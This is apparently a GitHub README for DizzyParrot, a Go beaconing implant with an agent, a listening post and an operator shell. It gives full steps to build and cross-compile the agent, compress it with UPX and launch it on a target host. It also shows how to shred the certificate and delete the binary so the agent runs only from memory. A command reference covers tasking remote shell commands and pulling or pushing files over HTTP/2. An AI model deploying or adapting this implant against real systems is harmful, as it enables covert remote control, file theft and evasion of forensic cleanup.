# DizzyParrot

[![Generic badge](https://img.shields.io/badge/Go-v1.14-blue.svg)](https://shields.io/) [![GitHub license](https://img.shields.io/github/license/Naereen/StrapDown.js.svg)](https://github.com/Naereen/StrapDown.js/blob/master/LICENSE)

A simple beaconing implant written in Go. DizzyParrot consist of an agent, listening post, and interactive shell. The agent communicates to the LP over HTTP/2 at a specified interval. An agent can be tasked using the interactive shell to pull and push files, and execute commands on the target host. 

![Shell](https://user-images.githubusercontent.com/10587919/78269929-34740c80-74d8-11ea-94cf-ecdc0d130dbe.png)

## Getting Started

#### Install dependencies (Debian and Ubuntu)
```
apt update && apt -y upgrade && apt -y install build-essential postgresql screen vim git upx
```

#### Start Postgres and create user
```
# Command is provided after installing dependencies
pg_ctlcluster 11 main start

# Verify
pg_ctlcluster 11 main status

# Change to postgres user
su - postgres

# Create user
createuser --interactive --pwprompt
# Enter name of role to add: dizzy
# Enter password for new role: dizzy
# Enter it again: dizzy
# Shall the new role be a superuser? (y/n) y

# Exit from postgres user
exit
```

#### Install go
```
wget https://dl.google.com/go/go1.14.1.linux-amd64.tar.gz
tar -C /usr/local -xzf go1.14.1.linux-amd64.tar.gz
rm -f go1.14.1.linux-amd64.tar.gz

echo "export PATH=$PATH:/usr/local/go/bin" >> ~/.profile
source ~/.profile
```
#### Build with Makefile

Edit the Makefile to include the LP and agent specific information. This can be overridden from the command line as an alternative. Additional architectures can be added. To view a list of architectures supported natively by go, use the go tool command.

```
go tool dist list
```

Generic build instructions with make.
```
# Clone repo
git clone https://github.com/af001/DizzyParrot.git
cd DizzyParrot

# Install dependencies
make deps

# Build a server, lp, and shell
make all

# Make the server
make build_server

# Make a custom agent
make build_mips

# Make a custom agent and override Makefile enviornmental variables
make build_arm NAME=A10002

# Override options
make build_ppc NAME=A10002 URL=https://localhost:8443/portal/status SECRET=dizzyparrot CALLBACK=300 JITTER=60
```

#### Build manually. Clone the repo using git and go get dependencies
```
# Clone repo
git clone https://github.com/af001/DizzyParrot.git

# Go dependencies 
go get gopkg.in/yaml.v2
go get golang.org/x/net/http2
go get github.com/lib/pq
go get github.com/c-bata/go-prompt
go get github.com/common-nighthawk/go-figure
go get github.com/jedib0t/go-pretty/table
```

#### Build LP and shell
```
cd server; go build server.go
cd shell; go build shell.go
```

#### Build agent 
```
# Build for host Linux
go build -ldflags "-s -w -X main.name=A10000 -X main.secret=dirtyparrot -X main.callback=300 -X main.jitter=60 -X main.url=https://localhost:8443/portal/details"

# Cross-compile mips
GOOS=linux GOARCH=mips go build -ldflags "-s -w -X main.name=A10000 -X main.secret=dirtyparrot -X main.callback=300 -X main.jitter=60 -X main.url=https://localhost:8443/portal/details"

# To compress binaries to a smaller size, use upx
upx --brute client
```

#### Start the LP
```
# Make sure to set the common name as 'localhost'. If you don't, you may recieve a TLS Handshake error on the LP
cd server; mkdir cert
openssl genrsa -out cert/server.key 4096
openssl req -new -x509 -sha256 -days 1825 -key cert/server.key -out cert/server.crt

# Start the LP
./server -c config.yml

# To use a screen session
screen -S DIZZY_LP
./server -c config.yml

# To background screen
ctrl+a d

# To interact with screen session
screen -ls
screen -x DIZZY_LP
```

#### Start the shell
```
cd shell
./shell -c config.yml

# To use a screen session
screen -S DIZZY_SHELL
./shell -c config.yml

# To background screen
ctrl+a d

# To interact with screen session
screen -ls
screen -x DIZZY_SHELL
```

#### Execute agent on target host

If not using real certs, the client requieres the server certificate upon execution. After execution, the binary and certificate can be removed from disk. 

```
# Start agent
./client -c server.crt &

# To run in memory 
shred -fuz server.crt; rm -f client
```

#### Validate Postgres database
```
# Login to shell
sudo -u postgres psql

# View tables
\dt
```
#### Basic Usage

```
agents               : List available agents.
agent <agent name>   : Tag into an agent for interaction. Tag without a name brings the user back to home and lists agents. 
task <command>       : Task the agent to execute a command. Must start with shell. Ex: /bin/bash, /bin/sh, cmd.exe
staged               : Show jobs in the queue and are staged to be deployed to the agent.
deploy               : Move staged jobs into the deployed queue. Agent will pick these tasks up.
revoke               : Remove deployed jobs. 
revoke restage       : Removes deployed jobs and places in the staged queue to allow for additional commands to be added.
flush                : Flush the commands in the staged queue.
set callback <int>   : Task the agent to modify its callback. In seconds.
set jitter <int>     : Task the agent to offset the callback (+/-) by x seconds. In seconds.
kill                 : Kill the agent process.
job <job_id>         : Show the output from a job
jobs                 : List complete and deployed jobs.
pull <rfile>         : Pull a file from the target machine.
push <lfile> <rfile> : Push a local file to the target machine
forget <agent_name>  : Remove an agent from the database. 
dump agent           : Not yet implemented
dump job             : Not yet implemented
```

#### Todo
 
1. Add database column that indicates bool value for files.

2. Write files pulled to out folder instead of database. Based on bool value. Preserve pull path.

3. Add shell feature to dump agent results and commands to disk.

4. Add shell command to wipe database.

5. Add a scheduler option to run recurring commands at a given interval.
